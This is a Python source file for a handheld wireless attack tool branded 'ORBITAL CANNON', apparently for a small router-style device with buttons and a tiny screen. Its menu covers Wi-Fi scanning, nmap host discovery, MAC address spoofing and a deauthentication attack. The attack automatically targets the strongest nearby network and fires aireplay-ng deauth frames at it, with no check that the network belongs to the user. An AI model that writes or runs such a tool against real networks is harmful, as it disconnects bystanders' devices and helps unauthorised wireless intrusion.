import evdev
import struct
import time
import subprocess
import threading
import sys
import os
import collections
from select import select
from PIL import Image, ImageDraw, ImageFont

# Ensure we can import folc_core
sys.path.append("/root")
try:
    import folc_core
except ImportError:
    print("WARNING: folc_core not found, using mock")
    class MockCore:
        class WirelessTool:
            def scan_networks(self):
                return [("MOCK_NET", "00:11:22:33:44:55", "-50")]
            def deauth(self, *args, **kwargs):
                pass
        class NmapTool:
            def quick_scan(self):
                return ["192.168.1.1", "192.168.1.50"]
        class MacChangerTool:
            def random_mac(self): return True
            def reset_mac(self): return True
            
    folc_core = MockCore()

# --- CONSTANTS ---
FB_PATH = "/dev/fb0"
WIDTH = 128
HEIGHT = 128

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
CYAN = (0, 255, 255)
RED = (255, 50, 50)
GREEN = (50, 255, 50)
ORANGE = (255, 165, 0)
DARK_GRAY = (30, 30, 30)
BLUE = (50, 50, 255)
YELLOW = (255, 255, 0)

# --- CORE TOOLS ---
class Core:
    @staticmethod
    def get_ip():
        try:
            res = subprocess.check_output(["ifconfig", "wlan0"], encoding="utf-8")
            import re
            match = re.search(r"inet (addr:)?(\d+\.\d+\.\d+\.\d+)", res)
            if match: return match.group(2)
        except: pass
        return "NO IP FOUND"

    @staticmethod
    def scan():
        try:
            return folc_core.WirelessTool().scan_networks()
        except Exception as e:
            print(f"Scan error: {e}")
            return []

    @staticmethod
    def deauth(bssid, count=10):
        try:
            subprocess.run(["ifconfig", "wlan0", "down"], capture_output=True)
            subprocess.run(["iw", "wlan0", "set", "type", "monitor"], capture_output=True)
            subprocess.run(["ifconfig", "wlan0", "up"], capture_output=True)
            
            cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "wlan0"]
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except: return False

# --- GRAPHICS ---
class Display:
    def __init__(self):
        self.image = Image.new("RGB", (WIDTH, HEIGHT), BLACK)
        self.draw = ImageDraw.Draw(self.image)
        self.heartbeat = False

    def clear(self):
        self.draw.rectangle((0, 0, WIDTH, HEIGHT), fill=BLACK)

    def render(self):
        self.heartbeat = not self.heartbeat
        self.draw.point((WIDTH-1, 0), fill=GREEN if self.heartbeat else BLACK)
        pixels = self.image.load()
        try:
            with open(FB_PATH, "wb") as fb:
                data = bytearray()
                for y in range(HEIGHT):
                    for x in range(WIDTH):
                        r, g, b = pixels[x, y]
                        val = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)
                        data.extend(struct.pack("<H", val))
                fb.write(data)
        except IOError:
            pass

# --- APP ---
class App:
    def __init__(self):
        self.disp = Display()
        self.menu_stack = []
        
        # States: MENU, POPUP
        self.state = "MENU"
        self.popup_lines = []
        
        self.selected_idx = 0
        self.is_shift = False
        
        self.init_ui()
        self.boot_anim()

    def boot_anim(self):
        for i in range(0, 101, 10):
            self.disp.clear()
            self.disp.draw.text((10, 40), "ORBITAL CANNON", CYAN)
            self.disp.draw.text((10, 55), "CHARGING...", WHITE)
            self.disp.draw.rectangle((10, 80, 118, 90), outline=WHITE)
            self.disp.draw.rectangle((12, 82, 12 + int(1.04 * i), 88), fill=RED)
            self.disp.render()
            time.sleep(0.05)
        time.sleep(0.2)

    def init_ui(self):
        self.main_menu = [
            ("WIFI SCAN", self.ui_scan),
            ("NMAP SCAN", self.ui_nmap),
            ("DEAUTH ATTACK", self.ui_deauth),
            ("IP INFO", self.ui_ip),
            ("REBOOT", lambda: os.system("reboot")),
            ("STOCK UI", self.ui_stock)
        ]
        self.shift_menu = [
            ("RANDOM MAC", self.ui_mac_rand),
            ("RESET MAC", self.ui_mac_reset),
            ("ABOUT", lambda: self.alert("FOAC v10\nBy Gemini")),
            ("EXIT UI", lambda: sys.exit(0))
        ]

    def alert(self, msg):
        """Displays a popup message. Non-blocking state change."""
        self.state = "POPUP"
        self.popup_lines = msg.split('\n')
        self.draw()

    def show_busy(self, msg):
        """Shows a busy screen immediately (blocking draw)."""
        self.disp.clear()
        self.disp.draw.text((10, 50), msg, CYAN)
        self.disp.render()

    def ui_ip(self):
        ip = Core.get_ip()
        self.alert(f"IP ADDRESS:\n{ip}")

    def ui_scan(self):
        self.show_busy("SCANNING...")
        nets = Core.scan()
        if not nets:
            self.alert("NO NETWORKS\nFOUND")
            return
        
        # Format results for popup
        lines = ["RESULTS:"]
        for ssid, bssid, sig in nets[:4]:
            lines.append(f"{sig} {ssid[:9]}")
        self.alert('\n'.join(lines))

    def ui_nmap(self):
        self.show_busy("NMAP SCAN...")
        try:
            hosts = folc_core.NmapTool().quick_scan()
            if not hosts:
                self.alert("NO HOSTS\nFOUND")
            else:
                lines = ["HOSTS:"] + hosts[:4]
                self.alert('\n'.join(lines))
        except Exception as e:
             self.alert(f"ERROR:\n{str(e)[:15]}")

    def ui_mac_rand(self):
        self.show_busy("RANDOMIZING...")
        if folc_core.MacChangerTool().random_mac():
            self.alert("MAC CHANGED\nSUCCESS")
        else:
            self.alert("MAC CHANGE\nFAILED")

    def ui_mac_reset(self):
        self.show_busy("RESETTING...")
        if folc_core.MacChangerTool().reset_mac():
            self.alert("MAC RESET\nSUCCESS")
        else:
            self.alert("RESET\nFAILED")

    def ui_sniffer(self):
        self.alert("SNIFFER START\n(MOCK)")

    def ui_deauth(self):
        self.show_busy("SCANNING TGT...")
        nets = Core.scan()
        if not nets:
            self.alert("NO TARGETS")
            return

        target_ssid, target_bssid, sig = nets[0]
        
        self.disp.clear()
        self.disp.draw.text((5, 10), "TARGET ACQUIRED", RED)
        self.disp.draw.text((5, 30), f"SSID: {target_ssid[:10]}", WHITE)
        self.disp.draw.text((5, 45), f"MAC: {target_bssid}", DARK_GRAY)
        self.disp.draw.text((5, 70), "FIRING IN 2s...", ORANGE)
        self.disp.render()
        time.sleep(2)
        
        # Animation Loop
        Core.deauth(target_bssid, count=50)
        for i in range(10):
            self.disp.clear()
            self.disp.draw.text((20, 40), "ATTACKING", RED)
            if i % 2 == 0:
                 self.disp.draw.ellipse((34, 34, 94, 94), outline=RED, width=3)
            else:
                 self.disp.draw.ellipse((44, 44, 84, 84), outline=ORANGE, width=3)
            self.disp.render()
            time.sleep(0.2)
        
        self.alert("ATTACK\nCOMPLETE")

    def ui_stock(self):
        self.alert("ENTERING STOCK")
        os.system("echo '/etc/init.d/start_qt_daemon start' | nc localhost 9999")

    def draw(self):
        self.disp.clear()
        
        if self.state == "POPUP":
            # Draw Popup Box
            self.disp.draw.rectangle((5, 20, 123, 108), outline=RED, fill=DARK_GRAY)
            y = 30
            for line in self.popup_lines:
                self.disp.draw.text((10, y), line, WHITE)
                y += 15
            self.disp.draw.text((80, 95), "[OK]", GREEN) 
            
        elif self.state == "MENU":
            # Draw Menu
            menu = self.shift_menu if self.is_shift else self.main_menu
            
            # Bounds check
            if self.selected_idx >= len(menu):
                self.selected_idx = len(menu) - 1
            if self.selected_idx < 0:
                self.selected_idx = 0
            
            title = "ORBITAL [S]" if self.is_shift else "ORBITAL CANNON"
            header_bg = BLUE if self.is_shift else RED
            
            self.disp.draw.rectangle((0, 0, WIDTH, 18), fill=header_bg)
            self.disp.draw.text((5, 4), title, BLACK)
            
            # Simple scrolling logic
            display_rows = 5
            start_idx = max(0, self.selected_idx - 2)
            if start_idx + display_rows > len(menu):
                start_idx = max(0, len(menu) - display_rows)
                
            for i in range(display_rows):
                idx = start_idx + i
                if idx >= len(menu): break
                
                color = WHITE
                prefix = "  "
                if idx == self.selected_idx:
                    color = ORANGE
                    prefix = "> "
                    self.disp.draw.rectangle((0, 22 + i*16, WIDTH, 38 + i*16), fill=DARK_GRAY)
                
                self.disp.draw.text((5, 24 + i*16), f"{prefix}{menu[idx][0]}", color)
        
        self.disp.render()

    def run(self):
        devs = []
        try:
            devs = [evdev.InputDevice(os.path.join("/dev/input", p)) for p in os.listdir("/dev/input") if p.startswith("event")]
        except OSError: pass
        dev_map = {d.fd: d for d in devs}
        
        pwr_down = 0
        wps_down = 0
        
        self.draw()
        
        while True:
            # 1. Hardware Poll (Non-blocking)
            r, w, x = select(dev_map.values(), [], [], 0.05)
            
            current_time = time.time()
            needs_redraw = False
            
            # 2. Shift Mode Hold Logic
            if wps_down > 0 and (current_time - wps_down > 1.0) and not self.is_shift and self.state == "MENU":
                self.is_shift = True
                needs_redraw = True

            # 3. Input Processing
            for d in r:
                is_pwr = "pon" in d.name.lower() or "powerkey" in d.name.lower()
                is_wps = "wps" in d.name.lower() or "reset" in d.name.lower()
                
                try:
                    for ev in d.read():
                        if ev.type == evdev.ecodes.EV_KEY:
                            
                            # --- POWER BUTTON (Select / Back) ---
                            if is_pwr:
                                if ev.value == 1: # DOWN
                                    pwr_down = current_time
                                elif ev.value == 0: # UP
                                    if self.state == "POPUP":
                                        continue 
                                        
                                    if self.state == "MENU":
                                        if current_time - pwr_down > 0.8: # LONG PRESS (Back)
                                            self.selected_idx = 0
                                            needs_redraw = True
                                        else: # SHORT PRESS (Select)
                                            menu = self.shift_menu if self.is_shift else self.main_menu
                                            # Safe execution with bounds check
                                            if 0 <= self.selected_idx < len(menu):
                                                action = menu[self.selected_idx][1]
                                                if action: 
                                                    action()
                                                    needs_redraw = True

                            # --- WPS BUTTON (Menu / Shift) ---
                            elif is_wps:
                                if ev.value == 1: # DOWN
                                    wps_down = current_time
                                    
                                elif ev.value == 0: # UP
                                    if self.is_shift:
                                        self.is_shift = False
                                        needs_redraw = True
                                    else:
                                        if self.state == "POPUP":
                                            self.state = "MENU"
                                            needs_redraw = True
                                            
                                        elif self.state == "MENU":
                                            menu = self.main_menu
                                            self.selected_idx = (self.selected_idx + 1) % len(menu)
                                            needs_redraw = True
                                            
                                    wps_down = 0

                except OSError: pass
            
            if needs_redraw:
                self.draw()

if __name__ == "__main__":
    app = App()
    app.run()
